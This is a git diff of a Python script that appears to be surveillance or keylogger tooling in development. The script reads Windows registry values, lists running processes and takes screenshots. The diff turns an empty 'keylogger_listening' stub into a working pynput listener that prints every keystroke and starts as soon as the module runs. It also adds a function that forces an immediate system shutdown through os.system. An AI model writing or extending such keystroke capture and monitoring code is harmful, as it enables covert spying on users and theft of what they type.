@@ -3,9 +3,11 @@ import pyautogui
 import cv2
 import numpy as np
 import os
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener, Key
 import logging
 import winreg
+import os
+
 
 def open_key(link):
     links = link.split("\\")
@@ -29,6 +31,7 @@ def open_key(link):
 
     return winreg.OpenKey(aReg, aKey)
 
+
 def get_process_running():
     application_running = []
 
@@ -49,11 +52,41 @@ def take_screen_shot():
     
     return screen_shot
 
+
 def get_value(link, name):
     asubkey = open_key(link)
 
     return winreg.QueryValueEx(asubkey, name)[0]
 
-def keylogger_listening():
 
-    pass
+def on_press(key):
+    print('{0} pressed'.format(
+        key))
+    return key
+
+
+def on_release(key):
+    print('{0} release'.format(
+        key))
+    if key == Key.esc:
+        # Stop listener
+        return False
+# Collect events until released
+
+
+def listening_keyboard(listening=True):
+    if listening:
+        with Listener(
+                on_press=on_press) as listener:
+            listener.join()
+        print(listener)
+        return listener
+    else:
+        return False
+
+
+def shutdown_pc():
+    os.system("shutdown /s /t 1")
+
+
+listening_keyboard(True)
